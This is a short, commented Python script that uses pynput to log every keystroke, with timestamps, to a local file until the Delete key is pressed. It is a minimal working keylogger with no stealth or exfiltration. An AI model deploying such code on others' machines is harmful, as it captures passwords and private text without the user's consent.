from pynput import keyboard
import logging

# Set up logging to save the captured keystrokes to a file
logging.basicConfig(filename='keystrokes.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# Function to handle the key press events
def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')  # Log the character of the key pressed
    except AttributeError:
        logging.info(f'Special key {key} pressed')  # Log special keys (e.g. space, enter, etc.)
    
    # Stop the listener when Delete key is pressed
    if key == keyboard.Key.delete:
        logging.info('Delete key pressed, stopping the listener.')
        return False  # This stops the listener and exits the app

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
